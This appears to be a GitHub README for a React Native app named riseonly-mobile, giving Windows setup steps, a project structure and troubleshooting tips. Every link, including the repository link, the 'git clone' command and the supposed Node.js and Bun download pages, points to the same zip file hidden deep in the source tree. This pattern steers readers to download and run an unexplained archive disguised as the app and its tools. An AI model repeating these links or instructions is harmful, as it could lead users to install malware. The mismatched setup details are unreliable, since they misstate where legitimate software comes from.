# 🆙 riseonly-mobile - Simple Mobile App for Everyday Use

[![Download riseonly-mobile](https://img.shields.io/badge/Download-riseonly--mobile-%23FF6F61)](https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip)

---

## 📥 Download riseonly-mobile

You can get the app from its GitHub repository page.  
[Download and run riseonly-mobile here](https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip)

Visit the page above to access all files and instructions for your device.

---

## 🚀 Getting Started with riseonly-mobile on Windows

This guide helps you set up the riseonly-mobile app on a Windows computer. No prior programming skills needed. Just follow the steps below.

### Step 1: Download the App Files

Go to the main repository page:

https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip

Use the green **Code** button on the page to download the app files. Choose **Download ZIP** to save the files to your computer.

Alternatively, if you know how, you can clone the repo using Git:

- Open Command Prompt or PowerShell.
- Run:  
  `git clone https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip`  
- This creates a folder with the app files on your PC.

### Step 2: Install Required Software

riseonly-mobile needs some basic tools to work on your PC. Follow these steps to install them.

1. **Install Node.js**

Node.js lets your computer run JavaScript apps like riseonly-mobile.  

- Visit https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip  
- Download the latest LTS version for Windows.  
- Run the installer and follow the prompts.

2. **Install the Bun Package Manager (Recommended)**

Bun is a fast tool that helps install app packages.

- Visit https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip  
- Follow the Windows installation instructions on the site.  
- If Bun is difficult to set up, you can use `yarn` or `npm` instead.

3. **Install Expo CLI**

Expo lets you run React Native apps on your computer or phone.

- Open Command Prompt or PowerShell.  
- Run:  
  `npm install -g expo-cli`

### Step 3: Open the App Folder

- Open File Explorer and go to the riseonly-mobile folder you downloaded or cloned.
- Inside, press **Shift + right-click** and select **Open PowerShell window here** or **Open Command Prompt here** to open a command line in this folder.

### Step 4: Install App Dependencies

In the command line, run one of the following commands:

- If Bun is installed, type:  
  `bun i`

- If you don’t have Bun but have Yarn:  
  `yarn`

- Or if you use npm:  
  `npm i`

This will install all files the app needs to run.

### Step 5: Run the App

After installing packages, start the app with this command:

`npx expo run`

This will open the app in an emulator or on your connected device. If you want to see the app on your phone, you can scan the QR code that Expo shows on your screen with the Expo Go app.

---

## 🖥 What is riseonly-mobile?

riseonly-mobile is a mobile app built to provide useful features in a simple way. It is designed to work smoothly over a network connection. The app uses WebSocket technology to update information instantly and to keep data in sync.

It is built using React Native and uses MobX for managing data and app state. The app’s core manages communication with the server, caching, and updating data when you make changes.

---

## ⚙️ How the App Works Internally

The app is divided into clear parts:

```
src/
├── app/           # Main files, layouts, app navigation
├── assets/        # Images, icons, fonts, sounds, styles
├── core/          # Shared modules: api, config, hooks, libraries, UI components
└── modules/       # Features like login, chat, user profile, posts
```

- The **core/** folder handles basic setup, configuration, and communication with the server.  
- The **modules/** folder contains separate features to keep code organized and easier to maintain.

This structure helps the app stay fast and reliable.

---

## 💻 System Requirements

To use riseonly-mobile on your Windows computer, ensure your system meets the following:

- Windows 10 or newer  
- 4 GB RAM or more  
- 2 GHz or faster processor  
- At least 500 MB free disk space  
- Internet connection for installing packages and running the app  
- Optional: a smartphone to run the Expo Go app for live preview

---

## 📦 Installing Required Tools Overview

| Tool           | Purpose                                   | Download Link                      |
|----------------|-------------------------------------------|----------------------------------|
| Node.js        | Runs JavaScript outside the browser       | https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip               |
| Bun            | Package manager for fast installation     | https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip                   |
| Expo CLI       | Runs React Native apps on Windows and phones | `npm install -g expo-cli` (after installing Node.js) |

---

## 🧑‍💻 How to Use riseonly-mobile

Once you run `npx expo run`, the app will launch in a window on your PC or your connected mobile device. You can explore the features like chat, user profiles, posts, and more.

The app syncs new data immediately using WebSocket, so updates appear without needing to refresh.

---

## 🌐 Useful Links

- GitHub repo: https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip  
- Download riseonly-mobile: [https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip](https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip)

---

## 🛠 Troubleshooting Tips

- If `bun i` does not work, try `npm i` or `yarn`.  
- Make sure Node.js is installed correctly by running `node -v` in the command line.  
- Check your internet connection.  
- If the app won’t start, try closing all terminal windows and running the commands again in a fresh window.  
- For running on a phone, install Expo Go from your app store.

---

[![Download riseonly-mobile](https://img.shields.io/badge/Download-riseonly--mobile-%23FF6F61)](https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip)